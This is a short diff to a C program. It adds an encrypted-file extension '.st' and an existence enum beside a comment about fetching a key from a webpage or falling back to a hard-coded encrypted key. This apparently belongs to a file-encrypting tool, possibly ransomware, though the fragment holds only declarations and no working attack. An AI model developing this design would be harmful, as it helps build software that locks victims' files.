@@ -5,6 +5,13 @@
 #include <errno.h>
 
 #define MAX 1000000 // 1Mb
+#define ENC_EXT ".st"
+#define LEN_ENC_EXT 3
+
+enum {
+	EXIST,
+	NO_EXIST
+};
 
 // get the key from the webpage
 // or if not able to do it use the hard coded encrypted key
